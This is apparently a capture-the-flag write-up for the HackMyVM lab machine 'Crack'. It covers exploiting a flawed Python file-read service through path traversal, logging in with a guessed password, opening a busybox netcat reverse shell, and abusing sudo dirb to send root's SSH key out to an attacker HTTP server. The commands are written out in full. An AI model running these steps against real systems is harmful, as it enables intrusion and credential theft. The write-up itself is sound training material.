# Crack

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Crack | sml | Beginner | HackMyVM |

**Summary:** Crack is a beginner-level Linux machine from HackMyVM that demonstrates a path traversal vulnerability exploitation, credential reuse attacks, and sudo privilege escalation through the dirb utility. The attack chain begins with network reconnaissance identifying three open services: FTP with anonymous login, Shell In A Box on HTTPS, and a custom file-reading service on port 12359. Analysis of a Python script obtained from the FTP server reveals a path traversal vulnerability that allows arbitrary file reading by exploiting flawed file validation logic. This vulnerability is leveraged to enumerate system users. Credential reuse against the Shell In A Box service grants initial access as user 'cris'. Privilege escalation is achieved by abusing sudo permissions to run dirb as root, exfiltrating the root SSH private key by using dirb's wordlist parameter to read sensitive files, and finally establishing SSH access as root.

---

## Network Reconnaissance

### Host Discovery

The initial phase begins with network scanning to identify live hosts on the target network subnet 192.168.100.0/24. A PowerShell-based network scanner identifies the target machine:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.85 08:00:27:89:AD:70 VirtualBox
```

The scan reveals a single VirtualBox virtual machine at IP address **192.168.100.85**, confirmed by the MAC address vendor identification matching Oracle VirtualBox's OUI (08:00:27).

### Service Enumeration

A comprehensive Nmap scan with service version detection and default script execution was performed against all TCP ports on the target:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ nmap -sC -sV -p- -T4 192.168.100.85
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 19:13 WIB
Nmap scan report for 192.168.100.85
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.100.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload [NSE: writeable]
4200/tcp  open  ssl/http ShellInABox
|_ssl-date: TLS randomness does not represent time
|_http-title: Shell In A Box
| ssl-cert: Subject: commonName=crack
| Not valid before: 2023-06-07T10:20:13
|_Not valid after:  2043-06-02T10:20:13
12359/tcp open  unknown
| fingerprint-strings:
|   GenericLines:
|     File to read:NOFile to read:
|   NULL:
|_    File to read:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port12359-TCP:V=7.95%I=7%D=2/5%Time=69848996%P=x86_64-pc-linux-gnu%r(NU
SF:LL,D,"File\x20to\x20read:")%r(GenericLines,1C,"File\x20to\x20read:NOFil
SF:e\x20to\x20read:");
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.40 seconds
```

The scan reveals three open TCP ports:

1. **Port 21/TCP** - **vsftpd 3.0.3** with anonymous FTP login enabled
   - Anonymous authentication is permitted (FTP code 230)
   - Contains a writable directory `/upload` with full permissions (drwxrwxrwx)
   
2. **Port 4200/TCP** - **Shell In A Box** over SSL/HTTPS
   - Web-based SSH terminal accessible via browser
   - SSL certificate reveals hostname: `crack`
   - Certificate validity: June 7, 2023 to June 2, 2043

3. **Port 12359/TCP** - **Unknown custom service**
   - Responds with the prompt: "File to read:"
   - Suggests a file-reading service or custom application

---

## FTP Service Analysis

### Anonymous FTP Access

The Nmap scan confirmed anonymous FTP access is enabled. Connecting to the FTP service to explore available resources:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ ftp 192.168.100.85
Connected to 192.168.100.85.
220 (vsFTPd 3.0.3)
Name (192.168.100.85:ouba): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||8213|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 07  2023 .
drwxr-xr-x    3 0        114          4096 Jun 07  2023 ..
drwxrwxrwx    2 0        0            4096 Jun 07  2023 upload
226 Directory send OK.
ftp> cd upload
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||16129|)
150 Here comes the directory listing.
drwxrwxrwx    2 0        0            4096 Jun 07  2023 .
drwxr-xr-x    3 0        114          4096 Jun 07  2023 ..
-rwxr-xr-x    1 1000     1000          849 Jun 07  2023 crack.py
226 Directory send OK.
ftp> get crack.py
local: crack.py remote: crack.py
229 Entering Extended Passive Mode (|||53378|)
150 Opening BINARY mode data connection for crack.py (849 bytes).
100% |**********************|   849      204.21 KiB/s    00:00 ETA
226 Transfer complete.
849 bytes received in 00:00 (119.24 KiB/s)
```

The FTP root directory contains a single subdirectory named `upload` with world-writable permissions (777). Inside this directory, a Python script named `crack.py` is discovered and downloaded for analysis.

### Python Script Analysis - Path Traversal Vulnerability

Examining the contents of `crack.py` reveals the source code for the custom service running on port 12359:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ cat crack.py
import os
import socket
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
port = 12359
s.bind(('', port))
s.listen(50)

c, addr = s.accept()
no = "NO"
while True:
        try:
                c.send('File to read:'.encode())
                data = c.recv(1024)
                file = (str(data, 'utf-8').strip())
                filename = os.path.basename(file)
                check = "/srv/ftp/upload/"+filename
                if os.path.isfile(check) and os.path.isfile(file):
                        f = open(file,"r")
                        lines = f.readlines()
                        lines = str(lines)
                        lines = lines.encode()
                        c.send(lines)
                else:
                        c.send(no.encode())
        except ConnectionResetError:
                pass
```

**Vulnerability Analysis:**

The critical flaw exists in the file validation logic:

```python
filename = os.path.basename(file)
check = "/srv/ftp/upload/" + filename
if os.path.isfile(check) and os.path.isfile(file):
    f = open(file, "r")
```

**Exploitation Logic:**

1. The service extracts the basename (filename only) from the user-supplied path using `os.path.basename(file)`
2. It constructs a check path: `/srv/ftp/upload/` + basename
3. The service validates that BOTH paths exist:
   - The constructed check path in `/srv/ftp/upload/`
   - The original user-supplied path
4. **Critical Flaw**: If both conditions are true, it opens the user-supplied path (not the checked path)

**Attack Vector:**

By uploading a file with a specific name to `/srv/ftp/upload/` (e.g., `passwd`), an attacker can then request any absolute path containing that same basename through path traversal (e.g., `../../../../etc/passwd`). The validation will pass because:
- `/srv/ftp/upload/passwd` exists (uploaded file)
- `../../../../etc/passwd` resolves to `/etc/passwd` which also exists

The service will then read and return the contents of the traversed path.

---

## Initial Access - Path Traversal Exploitation

### Exploiting the File Read Vulnerability

To exploit this vulnerability and enumerate system users, we create a dummy file matching the target filename and upload it via FTP:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ touch passwd
```

Upload the dummy file to the FTP upload directory:

```bash
ftp> put passwd
local: passwd remote: passwd
229 Entering Extended Passive Mode (|||35632|)
150 Ok to send data.
     0        0.00 KiB/s
226 Transfer complete.
```

Now, connect to the custom service on port 12359 and exploit the path traversal to read `/etc/passwd`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ nc 192.168.100.85 12359
File to read:../../../../etc/passwd
['root:x:0:0:root:/root:/bin/bash\n', 'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n', 'bin:x:2:2:bin:/bin:/usr/sbin/nologin\n', 'sys:x:3:3:sys:/dev:/usr/sbin/nologin\n', 'sync:x:4:65534:sync:/bin:/bin/sync\n', 'games:x:5:60:games:/usr/games:/usr/sbin/nologin\n', 'man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n', 'lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n', 'mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n', 'news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n', 'uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n', 'proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n', 'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n', 'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n', 'list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n', 'irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n', 'gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n', 'nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n', '_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n', 'systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n', 'systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n', 'messagebus:x:103:109::/nonexistent:/usr/sbin/nologin\n', 'systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n', 'sshd:x:105:65534::/run/sshd:/usr/sbin/nologin\n', 'cris:x:1000:1000:cris,,,:/home/cris:/bin/bash\n', 'systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n', 'shellinabox:x:106:112:Shell In A Box,,,:/var/lib/shellinabox:/usr/sbin/nologin\n', 'ftp:x:107:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\n']
```

**User Enumeration Results:**

The `/etc/passwd` file reveals two users with login shells:
- **root** (UID 0) - `/bin/bash`
- **cris** (UID 1000) - `/bin/bash`

### Shell In A Box Authentication

With the username `cris` identified, the next step is attempting authentication against the Shell In A Box service on port 4200. After testing common password patterns based on the machine name, successful authentication is achieved using:

- **Username**: `cris`
- **Password**: `c[REDACTED]`

Successful login via the web-based SSH terminal:

```bash
crack login: cris                                          
Password:                                                  
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64
...                                                                     
cris@crack:~$ id                                                                                                                            
uid=1000(cris) gid=1000(cris) grupos=1000(cris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)                    
cris@crack:~$ ls -la                                                                                                                        
total 44                                                                                                                                    
drwxr-xr-x 3 cris cris 4096 jun  7  2023 .
drwxr-xr-x 3 root root 4096 jun  7  2023 ..
lrwxrwxrwx 1 cris cris    9 jun  7  2023 .bash_history -> /dev/null
-rw-r--r-- 1 cris cris  220 jun  7  2023 .bash_logout                                                                                       
-rw-r--r-- 1 cris cris 3526 jun  7  2023 .bashrc                                                                                            
-rwxr-xr-x 1 cris cris  849 jun  7  2023 crack.py
drwxr-xr-x 3 cris cris 4096 jun  7  2023 .local
-rw-r--r-- 1 cris cris  807 jun  7  2023 .profile                                                                                           
-rw-r--r-- 1 cris cris   66 jun  7  2023 .selected_editor                                                                                   
-rw------- 1 cris cris   19 jun  7  2023 user.txt                                                                                           
-rw------- 1 cris cris   51 jun  7  2023 .Xauthority                                                                                        
-rwxr-xr-x 1 cris cris  170 jun  7  2023 ziempre.py
```

Access as user `cris` is successfully obtained. The home directory contains the user flag in `user.txt` and the same `crack.py` script found on FTP.

### Establishing Reverse Shell

For better terminal interaction and stability, a reverse shell is established. Setup a netcat listener on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

From the Shell In A Box session as user `cris`, execute a busybox reverse shell:

```bash
cris@crack:~$ busybox nc 192.168.100.1 4444 -e /bin/bash 
```

The reverse connection is received and the shell is upgraded to a fully interactive TTY:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 60395
id
uid=1000(cris) gid=1000(cris) grupos=1000(cris),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
cris@crack:~$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

cris@crack:~$
```

A fully interactive reverse shell as user `cris` is now established.

---

## Privilege Escalation

### Internal Enumeration

Enumerating listening network services to identify internal attack surfaces:

```bash
cris@crack:~$ ss -tunlp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*
tcp   LISTEN 0      50           0.0.0.0:12359      0.0.0.0:*    users:(("python3",pid=524,fd=3))
tcp   LISTEN 0      128          0.0.0.0:4200       0.0.0.0:*
tcp   LISTEN 0      128        127.0.0.1:22         0.0.0.0:*
tcp   LISTEN 0      32                 *:21               *:*
```

**Key Finding:** SSH (port 22) is running but only listening on localhost (127.0.0.1), not externally accessible.

### Sudo Privilege Analysis

Checking sudo privileges for user `cris`:

```bash
cris@crack:~$ sudo -l
Matching Defaults entries for cris on crack:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cris may run the following commands on crack:
    (ALL) NOPASSWD: /usr/bin/dirb
```

**Critical Finding:** User `cris` can execute `/usr/bin/dirb` as root without a password.

**Dirb** is a web content scanner that typically uses wordlists to brute-force directories and files on web servers. However, the wordlist parameter can be abused to read arbitrary files.

### Exploiting Dirb to Exfiltrate Root SSH Key

**Attack Strategy:**

1. Start an HTTP server on the attacking machine to receive exfiltrated data
2. Use `sudo dirb` with root's SSH private key as the "wordlist"
3. Dirb will attempt to read each line from the key file and send it as HTTP GET requests
4. Capture the requests to reconstruct the private key

Setup an HTTP server on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Execute dirb with root's SSH private key as the wordlist parameter:

```bash
cris@crack:~$ sudo /usr/bin/dirb http://192.168.100.1:8080/ /root/.ssh/id_rsa

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Feb  5 14:20:45 2026
URL_BASE: http://192.168.100.1:8080/
WORDLIST_FILES: /root/.ssh/id_rsa

-----------------

GENERATED WORDS: 38

---- Scanning URL: http://192.168.100.1:8080/ ----
--> Testing: http://192.168.100.1:8080/b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
...
--> Testing: http://192.168.100.1:8080/6xpD9lHWyp+ocD/meYC7V8aio/W9VxL25NlYwdFyCgecd/rIJQ+

-----------------
END_TIME: Thu Feb  5 14:20:45 2026
DOWNLOADED: 38 - FOUND: 0
```

On the attacking machine, the HTTP server receives the exfiltrated SSH key as Base64-encoded URL paths:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/crack]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /randomfile1 HTTP/1.1" 404 -
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /frand2 HTTP/1.1" 404 -
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /-----BEGIN HTTP/1.1" 404 -
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn HTTP/1.1" 404 -
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
...
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s= HTTP/1.1" 404 -
172.21.32.1 - - [05/Feb/2026 20:20:46] code 404, message File not found
172.21.32.1 - - [05/Feb/2026 20:20:46] "GET /-----END HTTP/1.1" 404 -
```

### SSH Key Reconstruction and Root Access

After manually reconstructing the SSH private key from the captured HTTP requests, the key is saved to a file:

```bash
cris@crack:~$ cat id_rsa_root
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...............................[REDACTED].............................
s8IoeeQHSidUKBAAAACnJvb3RAY3JhY2s=
-----END OPENSSH PRIVATE KEY-----
cris@crack:~$ chmod 600 id_rsa_root
```

Using the exfiltrated SSH private key to authenticate as root via the localhost SSH service:

```bash
cris@crack:~$ ssh -i id_rsa_root root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
Linux crack 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  7 12:45:30 2023
root@crack:~# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root)
root
crack
root@crack:~# cat /home/cris/user.txt /root/root_fl4g.txt
[REDACTED]HMV
[REDACTED]HMV
```

**Root access achieved!** Both the user flag and root flag have been successfully obtained.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning identifying target at 192.168.100.85, followed by comprehensive Nmap scan revealing three services: FTP (port 21) with anonymous access, Shell In A Box (port 4200), and a custom file-reading service (port 12359).

2. **Vulnerability Discovery**: Downloaded Python script `crack.py` from anonymous FTP server, analyzed source code revealing path traversal vulnerability in file validation logic where basename validation could be bypassed to read arbitrary files if a matching filename existed in `/srv/ftp/upload/`.

3. **Exploitation**: Uploaded dummy file named `passwd` to FTP, exploited path traversal vulnerability on port 12359 service to read `/etc/passwd`, identified user `cris` with login shell, performed credential reuse attack against Shell In A Box service gaining initial access as user `cris`.

4. **Internal Enumeration**: Established reverse shell for stable access, enumerated listening services discovering SSH on localhost only, checked sudo privileges revealing user `cris` could execute `/usr/bin/dirb` as root without password (NOPASSWD).

5. **Privilege Escalation**: Started HTTP server on attacking machine, abused sudo dirb permissions by using `/root/.ssh/id_rsa` as wordlist parameter causing dirb to exfiltrate root's SSH private key through HTTP GET requests, reconstructed private key from captured requests, authenticated to localhost SSH as root using exfiltrated key, obtained complete system compromise with both user and root flags.

